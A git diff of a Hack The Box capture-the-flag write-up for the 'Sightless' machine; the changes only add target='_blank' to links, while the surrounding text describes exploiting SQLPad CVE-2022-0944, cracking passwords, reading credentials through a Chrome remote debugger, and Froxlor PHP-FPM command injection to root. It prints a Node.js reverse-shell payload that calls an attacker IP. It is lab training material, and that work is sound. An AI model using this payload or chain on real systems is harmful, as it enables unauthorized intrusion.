@@ -12,7 +12,7 @@ mermaid: true
 
 ## TL;DR
 
-This writeup is based on the [__Sightless__](https://app.hackthebox.com/machines/Sightless) machine, which is an easy-rated Linux box on Hack the Box. It starts with several open ports: FTP (21), SSH (22), and HTTP (80). While enumerating the HTTP service, we discovered the `sqlpad.sightless.htb` subdomain running an outdated version of SQLPad (6.10.0), which is vulnerable to [CVE-2022-0944](https://github.com/0xRoqeeb/sqlpad-rce-exploit-CVE-2022-0944). We exploited this RCE vulnerability to gain remote code execution (RCE) on the server. After gaining access, we found a `.dockerenv` file, indicating the presence of a Docker container. We enumerated system files, cracked passwords, and obtained user `michael`'s SSH credentials. With these, we logged in via SSH and found the user flag. During privilege escalation, we discovered that an `Froxlor` application was running on a VirtualHost, so I accessed it and found the login panel. Further investigation led me to the `remote-debugging-port`, which pointed me toward the use of the `Google Chrome Debugger` to debug the web application. After debugging the application, I found the admin credentials, which gave me access to the admin dashboard. I came across `PHP-FPM`, which was vulnerable to an [RCE vulnerability](https://sarperavci.com/Froxlor-Authenticated-RCE/) via arbitrary command execution in the `php-fpm restart command` parameter in the `Froxlor` web panel. This allowed us to execute a reverse shell and escalate to root. We successfully gained root access and obtained the root flag. 
+This writeup is based on the [__Sightless__](https://app.hackthebox.com/machines/Sightless){:target="_blank"} machine, which is an easy-rated Linux box on Hack the Box. It starts with several open ports: FTP (21), SSH (22), and HTTP (80). While enumerating the HTTP service, we discovered the `sqlpad.sightless.htb` subdomain running an outdated version of SQLPad (6.10.0), which is vulnerable to [CVE-2022-0944](https://github.com/0xRoqeeb/sqlpad-rce-exploit-CVE-2022-0944){:target="_blank"}. We exploited this RCE vulnerability to gain remote code execution (RCE) on the server. After gaining access, we found a `.dockerenv` file, indicating the presence of a Docker container. We enumerated system files, cracked passwords, and obtained user `michael`'s SSH credentials. With these, we logged in via SSH and found the user flag. During privilege escalation, we discovered that an `Froxlor` application was running on a VirtualHost, so I accessed it and found the login panel. Further investigation led me to the `remote-debugging-port`, which pointed me toward the use of the `Google Chrome Debugger` to debug the web application. After debugging the application, I found the admin credentials, which gave me access to the admin dashboard. I came across `PHP-FPM`, which was vulnerable to an [RCE vulnerability](https://sarperavci.com/Froxlor-Authenticated-RCE/){:target="_blank"} via arbitrary command execution in the `php-fpm restart command` parameter in the `Froxlor` web panel. This allowed us to execute a reverse shell and escalate to root. We successfully gained root access and obtained the root flag. 
 
 ## Scanning Network
 
@@ -86,7 +86,7 @@ Let's browse the `SQLPad` website and enumerate it to run SQL queries or find so
 
 ![SQLPad Version](/assets/images/writeups/Sightless-HTB/3.png)
 
-The SQLPad version identified was `6.10.0`. After researching, I found that this version is vulnerable to [__CVE-2022-0944__](https://github.com/0xRoqeeb/sqlpad-rce-exploit-CVE-2022-0944). 
+The SQLPad version identified was `6.10.0`. After researching, I found that this version is vulnerable to [__CVE-2022-0944__](https://github.com/0xRoqeeb/sqlpad-rce-exploit-CVE-2022-0944){:target="_blank"}. 
 
 ## Exploitation
 
@@ -96,7 +96,7 @@ As SQLPad is built with Node.js, I used the `child_process` module to execute ar
 
 Payload - `process.mainModule.require('child_process').exec('/bin/bash -c "bash -i >& /dev/tcp/{args.attacker_ip}/{args.attacker_port} 0>&1"');`
 
-I utilized the Python-based [__SQLPad RCE Exploit__](https://github.com/0xRoqeeb/sqlpad-rce-exploit-CVE-2022-0944) for this.
+I utilized the Python-based [__SQLPad RCE Exploit__](https://github.com/0xRoqeeb/sqlpad-rce-exploit-CVE-2022-0944){:target="_blank"} for this.
 
 Let's use this exploit to perform template injection in new SQLPad query. 
 
@@ -177,7 +177,7 @@ I identified that `127.0.0.1:8080` is likely used by the Froxlor service. I proc
 
 ![Froxlor](/assets/images/writeups/Sightless-HTB/13.png)
 
-While browsing and reviewing the running processes on the system, I came across a remote debugging port. I realized that the Google Chrome Debugger could assist in debugging the web application. The `Google Chrome Debugger` is a tool that allows debugging of web applications when the Google Chrome debugger is running on a specific port using the `--remote-debugging-port=<port>` flag. Let's use [__Chrome Remote Debugger Pentesting__](https://exploit-notes.hdks.org/exploit/linux/privilege-escalation/chrome-remote-debugger-pentesting/) methodology to debug web applications.
+While browsing and reviewing the running processes on the system, I came across a remote debugging port. I realized that the Google Chrome Debugger could assist in debugging the web application. The `Google Chrome Debugger` is a tool that allows debugging of web applications when the Google Chrome debugger is running on a specific port using the `--remote-debugging-port=<port>` flag. Let's use [__Chrome Remote Debugger Pentesting__](https://exploit-notes.hdks.org/exploit/linux/privilege-escalation/chrome-remote-debugger-pentesting/){:target="_blank"} methodology to debug web applications.
 
 ![Remote Debugging Port](/assets/images/writeups/Sightless-HTB/14.png)
 
@@ -218,7 +218,7 @@ FPM (FastCGI Process Manager) is a primary PHP FastCGI implementation, containin
 
 FPM requires the `php-fpm restart command`, the `configuration directory of php-fpm`, and the `process manager control`. Let's combine the `Froxlor` version and `PHP-FPM` and search to see if any vulnerabilities exist for this version.
 
-I searched for `Froxlor RCE` and I have found this blog [__Disclosing Froxlor V2.x Authenticated RCE as Root Vulnerability via PHP-FPM__](https://sarperavci.com/Froxlor-Authenticated-RCE/).
+I searched for `Froxlor RCE` and I have found this blog [__Disclosing Froxlor V2.x Authenticated RCE as Root Vulnerability via PHP-FPM__](https://sarperavci.com/Froxlor-Authenticated-RCE/){:target="_blank"}.
 
 The vulnerability allows running arbitrary commands in the `php-fpm restart command` parameter. In the blog above, it is explained that there are a couple of steps to follow in order to exploit the vulnerability.
 
@@ -254,4 +254,4 @@ Let's wait for a few minutes and then check the listener to see if the root shel
 
 ![Machine Pwned](/assets/images/writeups/Sightless-HTB/Pwned.png)
 
-Thanks for reading this far. If you enjoyed the writeup, do support me [__here__](https://www.buymeacoffee.com/h4xplo1t).
+Thanks for reading this far. If you enjoyed the writeup, do support me [__here__](https://www.buymeacoffee.com/h4xplo1t){:target="_blank"}.
